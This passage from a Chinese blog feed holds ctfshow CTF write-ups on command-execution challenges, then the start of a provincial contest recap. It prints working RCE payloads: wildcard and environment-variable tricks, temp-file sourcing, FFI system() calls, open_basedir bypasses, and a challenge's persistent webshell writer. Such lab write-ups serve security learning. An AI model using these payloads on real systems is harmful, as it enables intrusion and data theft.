class="line">?c=c&#x27;&#x27;at$&#123;IFS&#125;fla&#x27;&#x27;g.p&#x27;&#x27;hp</span><br></pre></td></tr></table></figure><h1 id="WEB-54-绕正则"><a href="#WEB-54-绕正则" class="headerlink" title="WEB-54(绕正则)"></a>WEB-54(绕正则)</h1><p>关于<code>.*</code><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687663891064-438d2f3d-60f0-4dcf-984b-458bf826542b.png" alt="img"></p><p>linux一切都是文件 通过文件执行命令 在bin目录下存放着命令文件 我们一般调用命令系统就会调用这里的文件（我是这么认为的）</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687664362024-d939184f-168b-40df-980e-66a3bc44a8fe.png" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=/bin/?at$&#123;IFS&#125;f???????</span><br></pre></td></tr></table></figure><p>?是通配符 去模糊匹配一个字符</p><h1 id="WEB-55-56（无字母数字rce）"><a href="#WEB-55-56（无字母数字rce）" class="headerlink" title="WEB-55~56（无字母数字rce）"></a>WEB-55~56（无字母数字rce）</h1><h2 id="解法一-1"><a href="#解法一-1" class="headerlink" title="解法一"></a>解法一</h2><p>参考p神<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p><p>认识source和<code>.</code></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687675407237-2f98e932-ad55-4dfc-ab46-feae73f782dc.png" alt="img"></p><p>也就是说source或者<code>.</code>当然这道题目只能用<code>.</code>来执行我们文件中命令 也就是把我们的文件当作脚本运行</p><p>不知道为什么我本地没打通 估计是后续这个漏洞被修复了</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687675589848-06fa3171-78af-486d-b69b-c55822aa3a24.png" alt="img"></p><p>那么就需要一个包含我们恶意命令的文件 直接构造一个post上传的数据包</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>POST数据包POC<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://ec5969bd-4909-4435-9d77-ac7ffe92bbfe.challenge.ctf.show/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">      <span class="comment">&lt;!--链接是当前打开的题目链接--&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>文件名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>当我们上传上去之后 PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是&#x2F;tmp&#x2F;phpXXXXXX，文件名最后6个字符是随机的大小写字母。</p><p>然后在进行<code>.</code>和linux通配符组合拳去打</p><p>这里payload根据p神的文章<code>?c=. /???/????????[@-[]</code>要利用<code>[@-[]</code>去限制下最后一位为大写 不然匹配到很多文件无结果 因此打payload的时候有时候会匹配不到 用bp多提交几次就行</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687676153214-1d7165a1-414b-4f05-a5e7-a0a35515255d.png" alt="img"></p><p>随便上传一个文件 然后内容：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">ls /</span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687676290049-2ef242ab-2c80-48ac-b72a-f7515b45b1c9.png" alt="img"></p><p>当然bash或者zsh等等都行 shell具体解释器都可以</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687676263096-cdd7758e-47bc-4bcd-b37a-eb3ebdded252.png" alt="img"></p><h2 id="解法二-1"><a href="#解法二-1" class="headerlink" title="解法二"></a>解法二</h2><p>其实也是利用通配符去执行命令文件 <code>?c=/???/????64 ????.???</code></p><p>其实就是去执行 <code>/bin/base64 flag.php</code></p><h1 id="WEB-57-特殊方法构造数字"><a href="#WEB-57-特殊方法构造数字" class="headerlink" title="WEB-57(特殊方法构造数字)"></a>WEB-57(特殊方法构造数字)</h1><p>根据题目flag在36.php中 那么我们只需要构造出数字36即可</p><p>首先来认识一下<code>$&#123;_&#125;和$(())</code></p><p><code>$&#123;_&#125;</code> 是一种特殊的变量，它表示上一个命令的最后一个参数  </p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687751963911-f92a0b8e-b2d2-4de3-a23e-203f31474246.png" alt="img"></p><p>注意一下 如果没有上一个命令则表示为空</p><p> 在Linux中，<code>$(())</code>是一种用于进行数学运算的特殊语法结构。它通常用于shell脚本中，用于求值一个数学表达式并返回结果。  </p><p>那么计算空字符就是0 可以<code>$(($&#123;_&#125;))</code>打组合拳</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687752142638-33aae5c9-3710-483e-9073-0b7d15b41663.png" alt="img"></p><p>这样就可以构造出数字了</p><p>再通过按位取反不断的构造出数字 当时对按位取反还是有点疑惑 不过知乎上一篇稿子解答了我的疑惑<a href="https://zhuanlan.zhihu.com/p/161465089">https://zhuanlan.zhihu.com/p/161465089</a></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687752194916-1a2ad9be-8a53-44d5-aae7-40bc5701cfb9.png" alt="img"></p><p><strong>计算机所有二进制输出都是补码的形式</strong> 这句话解答了我对补码的疑惑</p><p>简单理解就是如下：</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687751488270-6a4b96d5-ad14-4847-ba20-740380bf94ee.png" alt="img"></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687752581243-411a5b59-3fd4-435f-b2ae-a041f8eb682d.png" alt="img"></p><p>然后通过取反得到-1 再拼接得到-2</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687752418481-17fa71fd-5a2b-40af-989e-2cc6d2b92510.png" alt="img"></p><p>这样不断的拼接到-37 然后再取反就得到36了</p><p>payload：<code>$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</code></p><h1 id="WEB-58-65-文件读取函数"><a href="#WEB-58-65-文件读取函数" class="headerlink" title="WEB-58~65(文件读取函数)"></a>WEB-58~65(文件读取函数)</h1><p>system一类的函数都被禁了 所以只能用php中的特殊函数 用文件读取的函数读就行了</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687753369662-556faed8-7490-43d6-89df-0b6e027d753c.png" alt="img"></p><p>post：<code>c=show_source(&#39;flag.php&#39;);</code></p><p><code>c=highlight_file(&#39;flag.php&#39;);</code>有很多类似于无参rce构造呢种套娃 </p><h1 id="WEB-66-waf-show-source"><a href="#WEB-66-waf-show-source" class="headerlink" title="WEB-66(waf show_source())"></a>WEB-66(waf show_source())</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=print_r(scandir(&#x27;/&#x27;));</span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687758908328-a73a76e2-7820-4f49-81e3-a3ba983d16d2.png" alt="img"></p><p>当前目录下的flag.php是假的 </p><p>show_source()被waf了 用highlight_file()读flag.txt即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=highlight_file(&#x27;/flag.txt&#x27;);</span><br></pre></td></tr></table></figure><h1 id="WEB-67-waf-print-r"><a href="#WEB-67-waf-print-r" class="headerlink" title="WEB-67(waf print_r())"></a>WEB-67(waf print_r())</h1><p>用var_dump() bypass即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=highlight_file(&#x27;/flag.txt&#x27;);</span><br></pre></td></tr></table></figure><h1 id="WEB-68-70-waf-highlight-file"><a href="#WEB-68-70-waf-highlight-file" class="headerlink" title="WEB-68~70(waf highlight_file())"></a>WEB-68~70(waf highlight_file())</h1><p> 因为禁用了highlight_file()所以源码也不显示了 2333 而且好多题目的payload都可以打通好几个关卡 题目太多质量真不太行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=include(&#x27;/flag.txt&#x27;);</span><br></pre></td></tr></table></figure><h1 id="WEB-71-输出缓冲区"><a href="#WEB-71-输出缓冲区" class="headerlink" title="WEB-71(输出缓冲区)"></a>WEB-71(输出缓冲区)</h1><p>给了源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">  <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">  <span class="variable">$s</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">  <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">  <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>涉及到输出缓冲区知识 </p><p>ob_get_contents()</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687760675094-25063e0b-5792-4f97-b44f-e12bd073111b.png" alt="img"></p><p>ob_end_clean()</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687760729756-1353ad44-911d-4aef-9a88-e499dcec5ce2.png" alt="img"></p><p>根据源码 我的理解是将eval()输出的内容会到输出缓存区</p><p>然后通过ob_get_contents()函数赋值给s 然后通过一个正则匹配将内容替换不让我们得到我们想要的flag </p><p>那么如果我们执行完eval()函数之后不进行之后的操作就可以bypass了 这也是官方payload的原理</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687761011069-74a43caf-2a46-41a3-bd40-37d972cb9a4e.png" alt="img"></p><p>因为根据官方文档 exit是个语法结构 如果不输出一个消息 则可以省略圆括号 就有下面两种paylaod</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c=include(&#x27;/flag.txt&#x27;);exit;</span><br><span class="line">c=include(&#x27;/flag.txt&#x27;);exit(0);</span><br></pre></td></tr></table></figure><h1 id="WEB-72-php原生类-UAF"><a href="#WEB-72-php原生类-UAF" class="headerlink" title="WEB-72(php原生类+UAF)"></a>WEB-72(php原生类+UAF)</h1><p>这道题目看大佬的WP是 开启了open_basedir。  </p><p>因此需要打组合拳</p><p>DirectoryIterator与glob:&#x2F;&#x2F;协议结合将无视open_basedir对目录的限制，可以用来列举出指定目录下的文件。  </p><p>这道题目用到了php原生类 之前有了解过 <a href="https://xz.aliyun.com/t/9293#toc-13">https://xz.aliyun.com/t/9293#toc-13</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="meta">?&gt;</span><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)</span><br><span class="line">&#123;<span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>先通过这个payload 获取flag文件名</p><p>首先通过<code>?&gt;</code>先闭合之前的<code>&lt;?php</code>再通过原生类DirectoryIterator()不断遍历来获取根目录下的文件</p><p>glob:&#x2F;&#x2F;协议 查找匹配的文件路径模式 </p><p><code>glob:///*</code>应该怎么理解呢 就是查找 根目录下<code>/*</code>这里的<code>*</code>就是linux的通配符 就是说根目录下的所有文件都被会读取</p><p>  <code>__toString()方法可以获取字符串形式的文件名 </code></p><p>读取的时候需要不断地遍历 因此需要</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687763552888-a3900bed-abe0-411e-aa26-194a77f58fd0.png" alt="img"></p><p>发现flag在flag0.txt 之后是pwn的知识我挺懵逼的</p><p>通过UAF脚本去读flag 挺夸张的</p><h1 id="WEB-72-74-php原生类"><a href="#WEB-72-74-php原生类" class="headerlink" title="WEB-72~74(php原生类)"></a>WEB-72~74(php原生类)</h1><p>和上面一样通过原生类获取flag文件名 然后这里可以直接用include()函数读flag即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=include(&#x27;/flagc.txt&#x27;);exit;</span><br></pre></td></tr></table></figure><h1 id="WEB-75-76-mysql-load-file"><a href="#WEB-75-76-mysql-load-file" class="headerlink" title="WEB-75~76(mysql load_file())"></a>WEB-75~76(mysql load_file())</h1><p>这题目太抽象了 连接mysql通过mysql的load_file()去读文件 。。。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="keyword">try</span> &#123;<span class="variable">$dbh</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="string">&#x27;mysql:host=localhost;dbname=ctftraining&#x27;</span>, <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;root&#x27;</span>);<span class="keyword">foreach</span>(<span class="variable">$dbh</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;</span>) <span class="keyword">as</span> <span class="variable">$row</span>)</span><br><span class="line">&#123;<span class="keyword">echo</span>(<span class="variable">$row</span>[<span class="number">0</span>]).<span class="string">&quot;|&quot;</span>; &#125;<span class="variable">$dbh</span> = <span class="literal">null</span>;&#125;<span class="keyword">catch</span> (PDOException <span class="variable">$e</span>) &#123;<span class="keyword">echo</span> <span class="variable">$e</span>-</span><br><span class="line">&gt;<span class="title function_ invoke__">getMessage</span>();<span class="keyword">exit</span>(<span class="number">0</span>);&#125;<span class="keyword">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure><h1 id="WEB-77-FFI"><a href="#WEB-77-FFI" class="headerlink" title="WEB-77(FFI)"></a>WEB-77(FFI)</h1><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687765898573-1e127140-9340-45ea-8344-54348dd7523d.png" alt="img"></p><p>我的理解是让php直接调用底层c语言的函数利用c代码实现功能</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=$ffi = FFI::cdef(<span class="string">&quot;int system(const char *command);&quot;</span>);</span><br><span class="line">$a=<span class="string">&#x27;/readflag &gt; 1.txt&#x27;</span>;</span><br><span class="line">$ffi-&gt;system($a);</span><br></pre></td></tr></table></figure><p>FFI::cdef()创建一个FFI对象</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687765988379-4c1b4a1f-62e9-418c-a270-ca5da1c112c0.png" alt="img"></p><p>然后利用c语言调用system()函数</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687766113821-5efd6715-e709-4dd4-a066-6974d5a2cf79.png" alt="img"></p><h1 id="WEB-118（-PATH-）"><a href="#WEB-118（-PATH-）" class="headerlink" title="WEB-118（${PATH}）"></a>WEB-118（${PATH}）</h1><p>fuzz一下发现只能用 大写字母A-Z和${}~.?:</p><p>通过linux环境变量截取字母方式构造rce</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687766943345-9b8e89eb-1525-4a07-bb3a-9341e8c19f03.png" alt="img"></p><p>关于PATH</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687767036592-081f4207-8e55-41a1-93e9-fba8c718b899.png" alt="img"></p><p>然后截取我们想要的字母RCE即可</p><p>构造 nl flag.php</p><p><code>$&#123;PATH:~A&#125;$&#123;PWD:~A&#125;$IFS????.???</code> 这里A和数字0是一样的效果都是下标 然后<code>~</code>表示从末尾开始截取</p><p>在这里我们的默认位置为<code>/var/www/html</code> 因此才能截取到l</p><h1 id="WEB-119-124-奇淫构造paylaod"><a href="#WEB-119-124-奇淫构造paylaod" class="headerlink" title="WEB-119~124(奇淫构造paylaod)"></a>WEB-119~124(奇淫构造paylaod)</h1><p>wal了PATH直接偷了payload</p><p>119:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/bin/cat flag.php</span><br><span class="line">code=$&#123;HOME:$&#123;<span class="comment">#&#125;:$&#123;##&#125;&#125;???$&#123;HOME:$&#123;#&#125;:$&#123;##&#125;&#125;??$&#123;HOME:$&#123;#HOSTNAME&#125;:$&#123;#SHLVL&#125;&#125; ????.???</span></span><br><span class="line">/bin/base64 flag.php</span><br><span class="line">code=$&#123;HOME:$&#123;<span class="comment">#&#125;:$&#123;##&#125;&#125;???$&#123;HOME:$&#123;#&#125;:$&#123;##&#125;&#125;?????$&#123;#RANDOM&#125; ????.???</span></span><br></pre></td></tr></table></figure><p>120:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=$&#123;PWD::$&#123;#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;?$&#123;USER:~A&#125;? ????.???</span><br></pre></td></tr></table></figure><p>121:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash64</span><br><span class="line">code=$&#123;PWD:$&#123;<span class="comment">#&#125;:$&#123;##&#125;&#125;???$&#123;PWD:$&#123;#&#125;:$&#123;##&#125;&#125;?????$&#123;#RANDOM&#125; ????.???</span></span><br><span class="line">/bin/rev</span><br><span class="line">code=$&#123;PWD::$&#123;<span class="comment">#?&#125;&#125;???$&#123;PWD::$&#123;#?&#125;&#125;$&#123;PWD:$&#123;#IFS&#125;:$&#123;#?&#125;&#125;?? ????.???</span></span><br></pre></td></tr></table></figure><p>122:</p><p><code>#</code> 和 <code>SHLVL</code>都不能用了,可以用<code>$?</code>来表示1</p><p>通过$?来实现的，$?是表示上一条命令执行结束后的传回值。通常0代表执行成功，非0代表执行有误</p><p>但是默认<code>$?</code>默认为0  可以 <code>&lt;A</code> 返回的错误值 使得 <code>$?</code> 为1  </p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687768487790-1c21e6fc-1c8e-42a2-8b99-b78ad3bd770e.png" alt="img"></p><p> <code>paylaod：code=&lt;A;$&#123;HOME::$?&#125;???$&#123;HOME::$?&#125;?????$&#123;RANDOM::$?&#125; ????.???</code> 多试几次就能成功</p><p>124：</p><p>buuctf Love math一模一样的题目 我博客也写过不赘述了</p><p>payload稍稍不同</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi&#123;abs&#125;($$pi&#123;acos&#125;)&amp;abs=system&amp;acos=cat%20flag.php</span><br></pre></td></tr></table></figure><h1 id="结尾："><a href="#结尾：" class="headerlink" title="结尾："></a>结尾：</h1><p>哦 终于结束这一章了 断断续续三天日完了 做吐了  开启下一章！ Keep Hacking！</p>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 命令执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023年 第三届陕西省大学生网络安全技能大赛（高职院校组）</title>
      <link href="/post/ba5897f5.html"/>
      <url>/post/ba5897f5.html</url>
      
        <content type="html"><![CDATA[<p>2023年 第三届陕西省大学生网络安全技能大赛（高职院校组）web复现</p><span id="more"></span><h1 id="easyrce"><a href="#easyrce" class="headerlink" title="easyrce"></a><strong>easyrce</strong></h1><p>源码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;PK&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$PK</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;PK&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">blacklistFilter</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;QUERY_STRING&quot;</span>]))&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$PK</span>;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklistFilter</span>(<span class="params"><span class="variable">$arg</span></span>) </span>&#123;</span><br><span class="line">  <span class="variable">$blacklist</span> = <span class="keyword">array</span>(<span class="string">&#x27;[&#x27;</span>, <span class="string">&#x27;]&#x27;</span>, <span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;@&#x27;</span>, <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;phpinfo&#x27;</span>, <span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;data&#x27;</span>, <span class="string">&#x27;filter&#x27;</span>, <span class="string">&#x27;#&#x27;</span>);</span><br><span class="line">  <span class="variable">$filteredInput</span> = <span class="title function_ invoke__">str_replace</span>(<span class="variable">$blacklist</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$arg</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$filteredInput</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这几乎该waf的全waf </p><p>直接用file:&#x2F;&#x2F;协议读就行了 再来好好看看这个协议;</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1686237629788-b92a3fc6-11a3-4ba6-8077-8cde77aff1f7.png" alt="img"></p><p>tql</p><h1 id="mua"><a href="#mua" class="headerlink" title="mua"></a>mua</h1><p>这题太抽象了！！</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">ignore_user_abort</span>(<span class="literal">true</span>);</span><br><span class="line">    <span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="string">&#x27;shell.php&#x27;</span>;</span><br><span class="line">    <span class="variable">$code</span> = <span class="string">&#x27;&lt;?php if(md5($_GET[&quot;pass&quot;])===&quot;c9b30e9fad74c62c2d0e4bb820964913&quot;)&#123; if(strlen($_GET[\&#x27;cmd\&#x27;])&lt;9)&#123; @system($_GET[\&#x27;cmd\&#x27;]); &#125; &#125; ?&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>,<span class="variable">$code</span>);</span><br><span class="line">    <span class="title function_ invoke__">usleep</span>(<span class="number">5000</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现给了源码 但是这个md5根本就不让人解出来</p><p>查看robots.txt 发现<code>/substr_pass.php</code></p><p>获得hint <code>?a=xx&amp;b=xx</code></p><p>传参<code>?a=0&amp;b=1</code> 不同数字时会给我们pass内容</p><p>当b&#x3D;3 a为其他数字 可以爆出pass的内容 这里需要写一个脚本完成</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 